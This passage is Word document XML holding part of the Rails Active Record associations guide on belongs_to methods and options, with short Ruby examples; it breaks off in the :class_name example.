    <w:p w14:paraId="18D46A44" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.1.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>(force_reload = false)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27FD63C8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns the associated object, if any. If no associated object is found, it returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3384"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="29BE807E" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3EE9C886" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="1877693714"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@customer</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @order.customer</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0C542403" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the associated object has already been retrieved from the database for this object, the cached version will be returned. To override this behavior (and force a database read), pass </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>force_reload</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> argument.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F65073" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.1.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>=(associate)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E78F896" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method assigns an associated object to this object. Behind the scenes, this means extracting the primary key from the associate object and setting this object’s foreign key to the same value.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3456"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="674C23A3" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="51E55DCB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="2101024143"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@order.customer = @customer</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6F001DD2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.1.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>build_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>(attributes = {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7284F9EC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>build_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns a new object of the associated type. This object will be instantiated from the passed attributes, and the link through this object’s foreign key will be set, but the associated object will </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> yet be saved.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7031"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="2E3EC24F" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7274BDA8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@customer</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @order.build_customer(:customer_number</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 123,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="039CB7AB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :customer_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "John Doe")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="38B12A77" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.1.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>create_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>(attributes = {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FB6E1EE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>create_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns a new object of the associated type. This object will be instantiated from the passed attributes, the link through this object’s foreign key will be set, and, once it passes all of the validations specified on the associated model, the associated object </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>will</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> be saved.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7151"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="30B4B7FF" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="26066B56" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@customer</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @order.create_customer(:customer_number</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 123,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F509017" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :customer_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "John Doe")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="20036BDC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.2 Options for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E4D8F91" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">While Rails uses intelligent defaults that will work well in most situations, there may be times when you want to customize the behavior of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association reference. Such customizations can easily be accomplished by passing options when you create the association. For example, this assocation uses two such options:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6024"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="77AEE5D9" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="408993CE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78F80F6A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :customer, :counter_cache</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F743D95" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :conditions</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "active = 1"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="096B6283" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0BB4A0C2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association supports these options:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B87EDBF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:autosave</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18B885DE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:class_name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79F44214" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:conditions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A97EE75" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:counter_cache</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A3B547" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="206E362B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:foreign_key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F20CD23" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:include</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="686A966C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:inverse_of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C199DDA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:polymorphic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC98E42" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:readonly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1863608E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:select</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="377BF49D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:touch</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2963FA63" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:validate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B896926" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.2.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:autosave</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6193D80E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:autosave</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t>, Rails will save any loaded members and destroy members that are marked for destruction whenever you save the parent object.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FD477A9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.2.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:class_name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14FF81C9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the name of the other model cannot be derived from the association name, you can use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:class_name</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to supply the model name. For example, if an order belongs to a customer, but the actual name of the model containing customers is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Patron</w:t>
      </w:r>
      <w:r>
        <w:t>, you’d set things up this way:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6024"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="21876C83" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2922CB5F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36E0BCB3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="007B2BED" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve">  belongs_to :customer, </w:t>
            </w:r>
            <w:r w:rsidRPr="007B2BED">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:class_name</w:t>
            </w:r>
            <w:r w:rsidRPr="007B2BED">
              <w:rPr>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="007B2BED">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; "Patron"</w:t>
            </w:r>
          </w:p>
